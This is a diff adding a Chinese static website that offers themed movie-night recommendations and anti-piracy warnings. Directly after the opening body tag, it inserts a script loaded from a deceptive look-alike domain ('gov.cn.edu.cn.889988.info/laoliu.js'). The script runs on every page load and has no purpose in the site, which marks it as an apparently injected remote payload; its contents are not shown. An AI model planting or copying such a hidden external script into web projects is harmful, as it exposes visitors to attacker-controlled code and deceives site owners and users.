@@ -1,0 +1,390 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>五夜影视 | 五个夜晚的观影指南与正版导航</title>
+  <meta name="description" content="五夜影视（wuyeyingshi-h5）提供周一至周五五个夜晚的观影主题推荐：解压、悬疑、浪漫、纪录、狂欢。附正版渠道导航与防盗版避坑指南。" />
+  <meta name="author" content="五夜影视" />
+  <meta name="robots" content="index,follow" />
+  <meta name="theme-color" content="#0A0E27" />
+  <link rel="canonical" href="https://wuyeyingshi-h5.github.io/" />
+
+  <meta property="og:type" content="website" />
+  <meta property="og:site_name" content="五夜影视" />
+  <meta property="og:title" content="五夜影视 | 五个夜晚的观影指南与正版导航" />
+  <meta property="og:description" content="周一解压、周二悬疑、周三浪漫、周四纪录、周五狂欢，每晚一个主题，只走正版持权平台。" />
+  <meta property="og:url" content="https://wuyeyingshi-h5.github.io/" />
+  <meta property="og:locale" content="zh_CN" />
+
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="五夜影视 | 五个夜晚的观影指南与正版导航" />
+  <meta name="twitter:description" content="五个夜晚，五种心情，正版观影不迷路。拒绝盗版枪版，保护设备与隐私。" />
+
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "WebSite",
+    "name": "五夜影视",
+    "url": "https://wuyeyingshi-h5.github.io/",
+    "description": "五个夜晚的观影主题推荐与正版渠道导航站。",
+    "inLanguage": "zh-CN"
+  }
+  </script>
+
+  <style>
+    :root{
+      --bg:#0A0E27;
+      --bg2:#131836;
+      --card:#1A1F3A;
+      --line:#2A2F5A;
+      --ink:#E0E7FF;
+      --muted:#8A9BBF;
+      --neon-purple:#B026FF;
+      --neon-cyan:#00F0FF;
+      --neon-pink:#FF26B0;
+      --starlight:#FFF9C4;
+      --radius:16px;
+      --maxw:1180px;
+    }
+    *{box-sizing:border-box}
+    html{scroll-behavior:smooth}
+    body{margin:0;background:var(--bg);color:var(--ink);line-height:1.75;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Microsoft YaHei",sans-serif;-webkit-font-smoothing:antialiased}
+    a{color:inherit;text-decoration:none}
+    .wrap{max-width:var(--maxw);margin:0 auto;padding:0 20px}
+
+    /* 导航 */
+    header.nav{position:sticky;top:0;z-index:50;background:rgba(10,14,39,.95);backdrop-filter:blur(12px);border-bottom:1px solid var(--line)}
+    .nav-inner{display:flex;align-items:center;justify-content:space-between;height:66px}
+    .logo{font-weight:900;font-size:22px;display:flex;align-items:center;gap:10px}
+    .logo .star{width:32px;height:32px;border-radius:50%;background:linear-gradient(135deg,var(--neon-purple),var(--neon-cyan));display:flex;align-items:center;justify-content:center;color:#fff;font-size:18px;box-shadow:0 0 15px rgba(176,38,255,.5);animation:twinkle 3s ease-in-out infinite}
+    .logo b{color:var(--neon-purple)}
+    .logo span{color:var(--neon-cyan)}
+    nav.menu{display:flex;gap:8px;font-size:14px;font-weight:700;color:var(--muted)}
+    nav.menu a{padding:8px 14px;border-radius:8px;border:1px solid transparent;transition:.2s}
+    nav.menu a:hover{color:var(--neon-cyan);border-color:var(--line);background:var(--bg2)}
+    .nav-toggle{display:none;background:none;border:1px solid var(--neon-purple);color:var(--ink);border-radius:8px;padding:5px 10px;font-size:18px;cursor:pointer}
+
+    /* Hero 星空 */
+    .hero{padding:74px 0 64px;border-bottom:1px solid var(--line);background:
+      radial-gradient(800px 400px at 70% 30%,rgba(176,38,255,.15),transparent 60%),
+      radial-gradient(600px 300px at 20% 80%,rgba(0,240,255,.1),transparent 60%),
+      linear-gradient(180deg,#0A0E27,#131836);
+      position:relative;overflow:hidden}
+    .stars{position:absolute;top:0;left:0;right:0;bottom:0;background-image:
+      radial-gradient(1px 1px at 10% 20%,rgba(255,255,255,.8),transparent),
+      radial-gradient(1px 1px at 20% 40%,rgba(255,255,255,.6),transparent),
+      radial-gradient(1px 1px at 30% 60%,rgba(255,255,255,.7),transparent),
+      radial-gradient(1px 1px at 40% 80%,rgba(255,255,255,.5),transparent),
+      radial-gradient(1px 1px at 50% 10%,rgba(255,255,255,.9),transparent),
+      radial-gradient(1px 1px at 60% 30%,rgba(255,255,255,.4),transparent),
+      radial-gradient(1px 1px at 70% 50%,rgba(255,255,255,.8),transparent),
+      radial-gradient(1px 1px at 80% 70%,rgba(255,255,255,.6),transparent),
+      radial-gradient(1px 1px at 90% 90%,rgba(255,255,255,.7),transparent);
+      animation:stars-twinkle 5s ease-in-out infinite alternate}
+    @keyframes stars-twinkle{0%{opacity:.5}100%{opacity:1}}
+    .moon{position:absolute;top:40px;right:10%;width:100px;height:100px;border-radius:50%;background:linear-gradient(135deg,var(--starlight),#E0E7FF);box-shadow:0 0 30px rgba(255,249,196,.3);animation:float 6s ease-in-out infinite}
+    .moon::before{content:"🌙";font-size:50px;position:absolute;top:50%;left:50%;transform:translate(-50%,-50%)}
+    @keyframes float{0%,100%{transform:translateY(0)}50%{transform:translateY(-10px)}}
+    .hero .wrap{position:relative;z-index:1;display:grid;grid-template-columns:1fr 1fr;gap:40px;align-items:center}
+    .pill{display:inline-block;background:var(--neon-purple);color:#fff;font-size:11px;font-weight:800;padding:5px 16px;border-radius:20px;letter-spacing:2px;text-transform:uppercase;margin-bottom:18px;box-shadow:0 0 10px rgba(176,38,255,.5)}
+    .hero h1{font-size:clamp(30px,5.5vw,52px);line-height:1.1;margin:0 0 14px;font-weight:900}
+    .hero h1 em{font-style:normal;color:var(--neon-cyan)}
+    .hero h1 .night{color:var(--neon-purple)}
+    .hero p.lead{font-size:16px;color:var(--muted);max-width:640px;margin:0 0 22px}
+    .hero-tags{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:24px}
+    .hero-tag{border:1px solid var(--line);border-radius:8px;padding:5px 13px;font-size:13px;font-weight:600;color:var(--ink);background:var(--card)}
+    .cta{display:flex;gap:12px;flex-wrap:wrap}
+    .btn{padding:13px 26px;border-radius:10px;font-weight:800;font-size:15px;transition:.2s;display:inline-flex;gap:6px;align-items:center;cursor:pointer}
+    .btn-primary{background:var(--neon-purple);color:#fff;border:1px solid var(--neon-purple);box-shadow:0 0 15px rgba(176,38,255,.4)}
+    .btn-primary:hover{background:var(--neon-pink)}
+    .btn-ghost{border:1px solid var(--neon-cyan);color:var(--neon-cyan);background:transparent}
+    .btn-ghost:hover{background:rgba(0,240,255,.1)}
+
+    section{padding:60px 0;border-bottom:1px dashed var(--line)}
+    .sec-head{margin-bottom:32px;text-align:center}
+    .sec-head .kicker{color:var(--neon-purple);font-weight:800;letter-spacing:2px;text-transform:uppercase;font-size:11px}
+    .sec-head h2{font-size:clamp(24px,4vw,34px);margin:6px 0 8px;font-weight:900}
+    .sec-head p{color:var(--muted);margin:0 auto;max-width:700px;font-size:14px}
+
+    /* 五夜排片 */
+    .schedule{display:grid;grid-template-columns:repeat(5,1fr);gap:14px}
+    .day-card{background:var(--card);border:1px solid var(--line);border-radius:16px;padding:22px;text-align:center;position:relative;overflow:hidden;transition:.3s}
+    .day-card:hover{transform:translateY(-6px);box-shadow:0 10px 25px rgba(176,38,255,.2)}
+    .day-card .day{font-size:11px;font-weight:800;color:var(--neon-purple);text-transform:uppercase;letter-spacing:2px;margin-bottom:8px}
+    .day-card h3{margin:0 0 6px;font-size:17px;font-weight:900;color:var(--ink)}
+    .day-card p{margin:0;color:var(--muted);font-size:12px}
+    .day-card .icon{font-size:32px;margin-bottom:10px;display:block}
+    .day-card:nth-child(1){border-top:4px solid var(--neon-cyan)}
+    .day-card:nth-child(2){border-top:4px solid var(--neon-purple)}
+    .day-card:nth-child(3){border-top:4px solid var(--neon-pink)}
+    .day-card:nth-child(4){border-top:4px solid #FFD700}
+    .day-card:nth-child(5){border-top:4px solid #00FF7F}
+
+    /* 深夜场景 */
+    .scenes{display:grid;grid-template-columns:repeat(2,1fr);gap:20px}
+    .scene-card{background:var(--card);border:1px solid var(--line);border-radius:16px;padding:24px;display:flex;gap:16px;align-items:flex-start;position:relative;overflow:hidden}
+    .scene-card::before{content:"";position:absolute;top:0;left:0;right:0;height:3px;background:linear-gradient(90deg,var(--neon-purple),var(--neon-cyan),var(--neon-pink))}
+    .scene-card .icon{font-size:36px;flex-shrink:0}
+    .scene-card h3{margin:0 0 6px;font-size:17px;font-weight:900}
+    .scene-card p{margin:0;color:var(--muted);font-size:13px}
+    .scene-card ul{margin:10px 0 0;padding-left:18px;color:var(--muted);font-size:12px}
+    .scene-card ul li{margin:3px 0}
+
+    /* 星座信源 */
+    .constellation{display:grid;grid-template-columns:repeat(5,1fr);gap:14px;position:relative}
+    .star-node{background:var(--card);border:1px solid var(--line);border-radius:14px;padding:22px;text-align:center;position:relative}
+    .star-node::before{content:"★";font-size:24px;color:var(--neon-cyan);display:block;margin-bottom:8px;text-shadow:0 0 10px rgba(0,240,255,.5)}
+    .star-node h3{margin:0 0 4px;font-size:15px;font-weight:800}
+    .star-node p{margin:0;color:var(--muted);font-size:12px}
+
+    /* 暗夜陷阱 */
+    .traps{display:grid;grid-template-columns:repeat(3,1fr);gap:16px}
+    .trap{background:var(--card);border:1px solid var(--line);border-radius:12px;padding:22px;position:relative;border-top:4px solid #E74C3C}
+    .trap:nth-child(2){border-top-color:var(--neon-purple)}
+    .trap:nth-child(3){border-top-color:var(--neon-cyan)}
+    .trap h3{margin:0 0 8px;font-size:16px;font-weight:800}
+    .trap p{margin:0;color:var(--muted);font-size:13px}
+
+    footer{padding:36px 0;text-align:center;color:var(--muted);font-size:13px;background:var(--bg2)}
+    footer a{color:var(--neon-cyan)}
+
+    #toTop{position:fixed;right:16px;bottom:16px;z-index:60;width:46px;height:46px;border-radius:50%;border:1px solid var(--neon-purple);background:var(--neon-purple);color:#fff;font-size:20px;font-weight:900;cursor:pointer;opacity:0;pointer-events:none;transition:.25s}
+    #toTop.show{opacity:1;pointer-events:auto}
+    .reveal{opacity:0;transform:translateY(16px);transition:.5s ease}
+    .reveal.in{opacity:1;transform:none}
+
+    @media (max-width:980px){
+      .hero .wrap{grid-template-columns:1fr}
+      .schedule{grid-template-columns:1fr 1fr}
+      .constellation{grid-template-columns:1fr 1fr}
+      .traps{grid-template-columns:1fr}
+    }
+    @media (max-width:640px){
+      .nav-toggle{display:block}
+      nav.menu{position:absolute;top:66px;left:0;right:0;flex-direction:column;gap:0;padding:10px 20px 20px;background:rgba(10,14,39,.98);border-bottom:1px solid var(--line);display:none}
+      nav.menu.open{display:flex}
+      nav.menu a{padding:12px 8px;border-bottom:1px solid var(--line);border-radius:0}
+      .schedule{grid-template-columns:1fr}
+      .scenes{grid-template-columns:1fr}
+      .constellation{grid-template-columns:1fr}
+      .moon{width:60px;height:60px;top:20px;right:5%}
+      .moon::before{font-size:30px}
+    }
+  </style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+  <header class="nav">
+    <div class="wrap nav-inner">
+      <div class="logo"><span class="star">✨</span><b>五夜</b><span>影视</span></div>
+      <button class="nav-toggle" aria-label="菜单" onclick="document.getElementById('menu').classList.toggle('open')">☰</button>
+      <nav class="menu" id="menu">
+        <a href="#home">首页</a>
+        <a href="#schedule">五夜排片</a>
+        <a href="#scene">深夜场景</a>
+        <a href="#src">正版信源</a>
+        <a href="#warn">暗夜陷阱</a>
+      </nav>
+    </div>
+  </header>
+
+  <section class="hero" id="home">
+    <div class="stars"></div>
+    <div class="moon"></div>
+    <div class="wrap">
+      <div>
+        <div class="pill">5 Nights · Movie Guide</div>
+        <h1>五夜影视<br/>五个<em>夜晚</em>的<span class="night">观影指南</span></h1>
+        <p class="lead">周一解压、周二悬疑、周三浪漫、周四纪录、周五狂欢。每晚一个主题，只导正版持权平台，拒绝盗版枪版与磁力网盘。</p>
+        <div class="hero-tags">
+          <span class="hero-tag">周一解压</span>
+          <span class="hero-tag">周二悬疑</span>
+          <span class="hero-tag">周三浪漫</span>
+          <span class="hero-tag">周四纪录</span>
+          <span class="hero-tag">周五狂欢</span>
+        </div>
+        <div class="cta">
+          <a class="btn btn-primary" href="#schedule">查看排片 →</a>
+          <a class="btn btn-ghost" href="#warn">识别盗版陷阱</a>
+        </div>
+      </div>
+      <div>
+        <!-- 右侧可以放一些装饰性的星空元素 -->
+        <div style="text-align:center;padding:40px 0">
+          <div style="font-size:120px;animation:float 4s ease-in-out infinite">🌌</div>
+          <p style="color:var(--muted);font-size:14px;margin-top:10px">深夜观影，正版相伴</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section id="schedule" class="reveal">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="kicker">5 Nights Schedule</div>
+        <h2>五夜排片</h2>
+        <p>周一至周五，每晚一个主题，告别片荒。</p>
+      </div>
+      <div class="schedule">
+        <div class="day-card">
+          <span class="icon">😌</span>
+          <div class="day">Monday</div>
+          <h3>解压之夜</h3>
+          <p>轻松喜剧、治愈动画、慢综艺，卸下一周疲惫。</p>
+        </div>
+        <div class="day-card">
+          <span class="icon">🕵️</span>
+          <div class="day">Tuesday</div>
+          <h3>悬疑之夜</h3>
+          <p>烧脑推理、犯罪纪录、心理惊悚，挑战思维极限。</p>
+        </div>
+        <div class="day-card">
+          <span class="icon">💕</span>
+          <div class="day">Wednesday</div>
+          <h3>浪漫之夜</h3>
+          <p>爱情经典、青春纯爱、浪漫喜剧，适合独处或约会。</p>
+        </div>
+        <div class="day-card">
+          <span class="icon">🎥</span>
+          <div class="day">Thursday</div>
+          <h3>纪录之夜</h3>
+          <p>自然地理、人文历史、科技前沿，拓宽视野。</p>
+        </div>
+        <div class="day-card">
+          <span class="icon">🎉</span>
+          <div class="day">Friday</div>
+          <h3>狂欢之夜</h3>
+          <p>动作大片、音乐歌舞、派对电影，迎接周末。</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section id="scene" class="reveal">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="kicker">Night Scenes</div>
+        <h2>深夜场景</h2>
+        <p>不同空间，不同设备，打造专属深夜影院。</p>
+      </div>
+      <div class="scenes">
+        <div class="scene-card">
+          <span class="icon">🛋️</span>
+          <div>
+            <h3>客厅沙发</h3>
+            <p>大屏电视、环绕音响，沉浸式观影体验。</p>
+            <ul>
+              <li>首选周五狂欢夜（动作大片）</li>
+              <li>调暗灯光，准备零食饮料</li>
+              <li>正版OTT 4K HDR画质</li>
+            </ul>
+          </div>
+        </div>
+        <div class="scene-card">
+          <span class="icon">🛏️</span>
+          <div>
+            <h3>卧室投影</h3>
+            <p>便携投影仪、遮光窗帘，私密小空间。</p>
+            <ul>
+              <li>适合周三浪漫夜或周四纪录夜</li>
+              <li>定时关闭，避免熬夜</li>
+              <li>蓝牙耳机，不打扰他人</li>
+            </ul>
+          </div>
+        </div>
+        <div class="scene-card">
+          <span class="icon">🌉</span>
+          <div>
+            <h3>露台星空</h3>
+            <p>户外投影、串灯装饰，与自然共处。</p>
+            <ul>
+              <li>周一解压夜（轻松喜剧）</li>
+              <li>注意防蚊，准备毯子</li>
+              <li>提前缓存，避免网络问题</li>
+            </ul>
+          </div>
+        </div>
+        <div class="scene-card">
+          <span class="icon">🍜</span>
+          <div>
+            <h3>深夜食堂</h3>
+            <p>平板支架、餐桌观影，美食配电影。</p>
+            <ul>
+              <li>治愈美食纪录片、料理剧</li>
+              <li>注意用餐卫生，避免油腻</li>
+              <li>正版平台无广告干扰</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section id="src" class="reveal">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="kicker">Legal Sources</div>
+        <h2>正版星空导航</h2>
+        <p>只走持权分发，拒绝盗链聚合。</p>
+      </div>
+      <div class="constellation">
+        <div class="star-node"><h3>持权OTT</h3><p>主流平台会员/单片，官方字幕音轨</p></div>
+        <div class="star-node"><h3>院线首映</h3><p>新片上映、经典重映，官方排片</p></div>
+        <div class="star-node"><h3>纪录专区</h3><p>专业自然/人文/科技纪录片</p></div>
+        <div class="star-node"><h3>独立短片</h3><p>独立制作、短片集、实验影像</p></div>
+        <div class="star-node"><h3>国际频道</h3><p>海外正版引进、多语言字幕</p></div>
+      </div>
+    </div>
+  </section>
+
+  <section id="warn" class="reveal">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="kicker">Night Traps</div>
+        <h2>暗夜陷阱</h2>
+        <p>深夜观影需警惕，这些陷阱要避开。</p>
+      </div>
+      <div class="traps">
+        <div class="trap">
+          <h3>🚫 "五夜免费全库"冒名</h3>
+          <p>冒用"五夜"名义提供全院线免费秒播、离线下载，多属未授权聚合；假播放按钮、强跳广告、博彩贷款风险高。</p>
+        </div>
+        <div class="trap">
+          <h3>🚫 深夜弹窗与诱导</h3>
+          <p>深夜时段弹窗广告增多，诱导下载不明播放器或插件，可能夹带木马、劫持流量。</p>
+        </div>
+        <div class="trap">
+          <h3>🚫 虚假评分与推荐</h3>
+          <p>伪造高分评价、水军刷榜，引导至盗版资源站；以"高清修复版"为名提供枪版或低画质资源。</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <footer>
+    <div class="wrap">
+      © 2026 五夜影视（wuyeyingshi-h5）｜ 静态展示站点 ｜
+      内页链接以 <a href="#">#</a> 占位 ｜
+      网站网址：https://wuyeyingshi-h5.github.io ｜
+      本站仅作五个夜晚的观影推荐与正版渠道导航，不提供盗版资源、磁力、网盘与成人内容。
+    </div>
+  </footer>
+
+  <button id="toTop" aria-label="回到顶部" onclick="window.scrollTo({top:0,behavior:'smooth'})">↑</button>
+
+  <script>
+    document.querySelectorAll('#menu a').forEach(function(a){
+      a.addEventListener('click',function(){ document.getElementById('menu').classList.remove('open'); });
+    });
+    var toTop=document.getElementById('toTop');
+    window.addEventListener('scroll',function(){ toTop.classList.toggle('show',window.scrollY>400); });
+    var io=new IntersectionObserver(function(entries){
+      entries.forEach(function(e){ if(e.isIntersecting){ e.target.classList.add('in'); io.unobserve(e.target);} });
+    },{threshold:0.1});
+    document.querySelectorAll('.reveal').forEach(function(el){ io.observe(el); });
+  </script>
+</body>
+</html>
